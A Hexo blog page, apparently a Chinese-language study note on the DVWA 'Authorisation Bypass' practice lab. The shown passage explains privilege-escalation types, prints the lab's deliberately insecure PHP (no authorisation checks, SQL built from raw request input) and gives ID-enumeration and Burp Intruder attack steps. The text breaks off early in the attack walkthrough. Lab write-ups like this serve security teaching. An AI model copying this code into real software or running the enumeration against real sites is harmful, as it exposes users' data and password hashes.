@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是权限绕过（Authorisation Bypass）？权限绕过也称为访问控制漏洞，指攻击者能够访问或执行他们不应该有权限的功能或资源，绕过应用程序的授权检查。 认证 vs 授权：    概念 英文 作用 问题    认证 Authentication 验证用户身份（你是谁？）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - Authorisation Bypass (权限绕过) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是权限绕过（Authorisation Bypass）？权限绕过也称为访问控制漏洞，指攻击者能够访问或执行他们不应该有权限的功能或资源，绕过应用程序的授权检查。 认证 vs 授权：    概念 英文 作用 问题    认证 Authentication 验证用户身份（你是谁？）">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.143Z">
+<meta property="article:modified_time" content="2025-11-20T15:23:17.518Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - Authorisation Bypass (权限绕过) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - Authorisation Bypass (权限绕过) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:23:17" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>24k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>21 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是权限绕过（Authorisation-Bypass）？"><a href="#什么是权限绕过（Authorisation-Bypass）？" class="headerlink" title="什么是权限绕过（Authorisation Bypass）？"></a>什么是权限绕过（Authorisation Bypass）？</h3><p>权限绕过也称为访问控制漏洞，指攻击者能够访问或执行他们不应该有权限的功能或资源，绕过应用程序的授权检查。</p>
+<p><strong>认证 vs 授权：</strong></p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>英文</th>
+<th>作用</th>
+<th>问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证</td>
+<td>Authentication</td>
+<td>验证用户身份（你是谁？）</td>
+<td>弱密码、会话劫持</td>
+</tr>
+<tr>
+<td>授权</td>
+<td>Authorisation</td>
+<td>验证用户权限（你能做什么？）</td>
+<td>权限绕过、越权访问</td>
+</tr>
+</tbody></table>
+<p><strong>权限绕过的类型：</strong></p>
+<h3 id="1-水平权限绕过（Horizontal-Privilege-Escalation）"><a href="#1-水平权限绕过（Horizontal-Privilege-Escalation）" class="headerlink" title="1. 水平权限绕过（Horizontal Privilege Escalation）"></a>1. 水平权限绕过（Horizontal Privilege Escalation）</h3><p>用户访问同级别其他用户的资源：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户A → 只能访问自己的订单</span><br><span class="line">攻击：修改<span class="attribute">order_id</span>=123 → <span class="attribute">order_id</span>=456</span><br><span class="line">结果：访问到用户B的订单</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-垂直权限绕过（Vertical-Privilege-Escalation）"><a href="#2-垂直权限绕过（Vertical-Privilege-Escalation）" class="headerlink" title="2. 垂直权限绕过（Vertical Privilege Escalation）"></a>2. 垂直权限绕过（Vertical Privilege Escalation）</h3><p>普通用户获取更高权限（如管理员）：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户 → 访问<span class="regexp">/admin/</span>panel</span><br><span class="line">结果：获得管理员功能</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-功能级权限绕过"><a href="#3-功能级权限绕过" class="headerlink" title="3. 功能级权限绕过"></a>3. 功能级权限绕过</h3><p>访问未授权的功能或API：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户 → POST <span class="regexp">/api/</span>admin/delete_user</span><br><span class="line">结果：执行管理员操作</span><br></pre></td></tr></table></figure>
+
+<p><strong>危害：</strong></p>
+<ul>
+<li>访问他人敏感数据</li>
+<li>修改其他用户信息</li>
+<li>执行管理员操作</li>
+<li>删除重要数据</li>
+<li>完全控制系统</li>
+</ul>
+<p><strong>常见原因：</strong></p>
+<ul>
+<li>只在前端隐藏功能</li>
+<li>依赖用户提供的参数判断权限</li>
+<li>不检查资源所有权</li>
+<li>Session中存储可篡改的权限信息</li>
+<li>URL可预测的管理功能</li>
+</ul>
+<p><strong>DVWA场景：</strong><br>一个用户管理系统，有普通用户和管理员两种角色。</p>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不检查用户权限，任何用户都可以访问管理功能。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ Low难度：完全没有权限检查 ★★★</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户是否已登录</span></span><br><span class="line"><span class="comment">// dvwaCurrentUser() - 获取当前登录用户名</span></span><br><span class="line"><span class="variable">$currentUser</span> = <span class="title function_ invoke__">dvwaCurrentUser</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 问题：只检查是否登录，不检查权限级别 ★★★</span></span><br><span class="line"><span class="comment">// 任何已登录用户都可以访问</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">    <span class="comment">// 未登录，重定向到登录页</span></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要查看的用户ID</span></span><br><span class="line"><span class="comment">// $_GET[&#x27;id&#x27;] - 从URL获取用户ID</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作1：不验证用户是否有权查看该用户 ★★★</span></span><br><span class="line"><span class="comment">// 问题：</span></span><br><span class="line"><span class="comment">// 1. 不检查当前用户是否是管理员</span></span><br><span class="line"><span class="comment">// 2. 不检查当前用户是否是该用户本人</span></span><br><span class="line"><span class="comment">// 3. 任何登录用户都可以查看任何用户的信息</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM users WHERE user_id = &#x27;<span class="subst">$userId</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 显示用户信息（包括敏感数据） ★★★</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;First Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;first_name&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Last Name: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;last_name&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Avatar: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;avatar&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="comment">// ★★★ 甚至显示密码哈希！ ★★★</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Password Hash: &quot;</span> . <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>] . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作2：管理员功能没有权限检查 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;delete&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$deleteUserId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;delete_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何用户都可以删除任何用户 ★★★</span></span><br><span class="line">    <span class="comment">// 完全没有检查：</span></span><br><span class="line">    <span class="comment">// 1. 当前用户是否是管理员</span></span><br><span class="line">    <span class="comment">// 2. 是否可以删除该用户</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;DELETE FROM users WHERE user_id = &#x27;<span class="subst">$deleteUserId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User deleted successfully!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 危险操作3：修改用户信息没有权限检查 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$updateUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$newUsername</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：任何用户都可以修改任何用户的信息 ★★★</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;UPDATE users SET user = &#x27;<span class="subst">$newUsername</span>&#x27; WHERE user_id = &#x27;<span class="subst">$updateUserId</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User updated successfully!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML表单：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 查看用户信息 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>View User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>View<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 删除用户 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Delete User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;delete_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修改用户名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>User ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>New Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacked&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;update&quot;</span>&gt;</span>Update<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>只检查认证，不检查授权</strong> - 登录即可访问所有功能</li>
+<li><strong>不验证资源所有权</strong> - 任何用户可以访问任何用户数据</li>
+<li><strong>管理功能无保护</strong> - 删除、修改功能没有权限检查</li>
+<li><strong>可预测的ID</strong> - 用户ID是连续数字，易于枚举</li>
+</ol>
+<p><strong>权限模型缺失：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">应该：</span><br><span class="line">用户A → 只能查看/修改自己的数据</span><br><span class="line">管理员 → 可以查看/修改所有用户数据</span><br><span class="line"></span><br><span class="line">实际：</span><br><span class="line">任何登录用户 → 可以查看<span class="regexp">/修改/</span>删除任何用户数据</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：水平越权-访问其他用户数据"><a href="#步骤1：水平越权-访问其他用户数据" class="headerlink" title="步骤1：水平越权 - 访问其他用户数据"></a>步骤1：水平越权 - 访问其他用户数据</h4><p><strong>攻击：查看其他用户信息</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">正常访问：?<span class="attribute">id</span>=1（查看自己的信息）</span><br><span class="line"></span><br><span class="line">攻击：</span><br><span class="line">?<span class="attribute">id</span>=2  → 查看用户<span class="attribute">ID</span>=2的信息</span><br><span class="line">?<span class="attribute">id</span>=3  → 查看用户<span class="attribute">ID</span>=3的信息</span><br><span class="line"><span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">结果：可以看到所有用户的信息，包括密码哈希</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用Burp Suite枚举所有用户：</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 拦截请求：GET /vulnerabilities/authbypass/?id=1</span><br><span class="line"><span class="bullet">2.</span> 发送到Intruder</span><br><span class="line"><span class="bullet">3.</span> 设置Payload位置：?id=§1§</span><br><span class="line"><span class="bullet">4.</span> Payload类型：Numbers（1-100）</span><br><span class="line"><span class="bullet">5.</span> 开始攻击</span><br><span class="line"><span class="bullet">6.</span> 结果：获取所有用户的信息</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：垂直越权-删除其他用户"><a href="#步骤2：垂直越权-删除其他用户" class="headerlink" title="步骤2：垂直越权 - 删除其他用户"></a>步骤2：垂直越权 - 删除其他用户</h4><p><strong>攻击：删除管理员账户</strong></p>
